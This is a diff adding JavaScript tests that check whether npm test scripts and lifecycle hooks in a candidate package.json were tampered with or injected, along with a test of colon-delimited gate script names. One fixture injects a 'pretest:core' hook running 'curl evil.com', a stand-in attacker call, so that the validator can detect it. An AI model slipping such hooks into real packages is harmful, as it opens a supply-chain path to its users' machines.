@@ -418,4 +418,120 @@ test('validatePlan: rejects non-npm gates by default without strictGates flag', 
   assert.ok(errors.some((e) => e.includes('plan.gate.test must match')));
 });
 
+test('verifyGateScriptIntegrity: recursively checks delegated scripts and lifecycle hooks with cycle safety', () => {
+  const basePkg = {
+    name: 'delegation-test',
+    scripts: {
+      test: 'npm run test:unit',
+      'test:unit': 'npm run test:core',
+      'test:core': 'node core.js',
+      'pretest:unit': 'node pre.js',
+    },
+  };
+
+  // 1. Untampered package with delegation passes
+  const cleanCand = {
+    name: 'delegation-test',
+    scripts: {
+      test: 'npm run test:unit',
+      'test:unit': 'npm run test:core',
+      'test:core': 'node core.js',
+      'pretest:unit': 'node pre.js',
+    },
+  };
+  assert.equal(verifyGateScriptIntegrity(cleanCand, basePkg, 'npm test'), true);
+
+  // 2. Candidate tampered nested delegated script
+  const tamperedNestedCand = {
+    name: 'delegation-test',
+    scripts: {
+      test: 'npm run test:unit',
+      'test:unit': 'npm run test:core',
+      'test:core': 'echo bypassed',
+      'pretest:unit': 'node pre.js',
+    },
+  };
+  assert.throws(
+    () => verifyGateScriptIntegrity(tamperedNestedCand, basePkg, 'npm test'),
+    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Gate script 'test:core' command string modified")
+  );
+
+  // 3. Candidate injected lifecycle hook on delegated script
+  const injectedNestedHookCand = {
+    name: 'delegation-test',
+    scripts: {
+      test: 'npm run test:unit',
+      'test:unit': 'npm run test:core',
+      'test:core': 'node core.js',
+      'pretest:core': 'curl evil.com',
+      'pretest:unit': 'node pre.js',
+    },
+  };
+  assert.throws(
+    () => verifyGateScriptIntegrity(injectedNestedHookCand, basePkg, 'npm test'),
+    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Unauthorized lifecycle hook injected in candidate: 'pretest:core'")
+  );
+
+  // 4. Candidate modified existing hook on delegated script
+  const modifiedNestedHookCand = {
+    name: 'delegation-test',
+    scripts: {
+      test: 'npm run test:unit',
+      'test:unit': 'npm run test:core',
+      'test:core': 'node core.js',
+      'pretest:unit': 'echo evil',
+    },
+  };
+  assert.throws(
+    () => verifyGateScriptIntegrity(modifiedNestedHookCand, basePkg, 'npm test'),
+    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Lifecycle hook 'pretest:unit' modified from baseline")
+  );
+
+  // 5. Candidate deleted delegated script
+  const missingNestedCand = {
+    name: 'delegation-test',
+    scripts: {
+      test: 'npm run test:unit',
+      'test:unit': 'npm run test:core',
+      'pretest:unit': 'node pre.js',
+    },
+  };
+  assert.throws(
+    () => verifyGateScriptIntegrity(missingNestedCand, basePkg, 'npm test'),
+    (err) => err.kind === 'gate_script_tampering' && err.message.includes("Candidate package.json missing required script 'test:core'")
+  );
+
+  // 6. Cyclic delegation is handled safely without infinite loop
+  const cyclePkg = {
+    name: 'cycle-test',
+    scripts: {
+      test: 'npm run test:a',
+      'test:a': 'npm run test:b',
+      'test:b': 'npm run test:a',
+    },
+  };
+  assert.equal(verifyGateScriptIntegrity(cyclePkg, cyclePkg, 'npm test'), true);
+});
+
+test('BRAIN_PLAN_SCHEMA & validatePlan: allow colon-delimited script names in gates', () => {
+  const plan = {
+    repo: '/tmp/repo',
+    base: 'main',
+    gate: {
+      build: 'npm run build:prod:esm',
+      test: 'npm run test:unit:fast',
+    },
+    tickets: [
+      { id: 'T1', title: 'Colon test', body: 'Body', scope: ['lib/**'], edges: [], tier: 'mid' },
+    ],
+  };
+
+  const schemaRes = validateJsonSchema(plan, BRAIN_PLAN_SCHEMA);
+  assert.equal(schemaRes.valid, true);
+
+  const errors = validatePlan(plan);
+  assert.equal(errors.length, 0);
+});
+
+
 
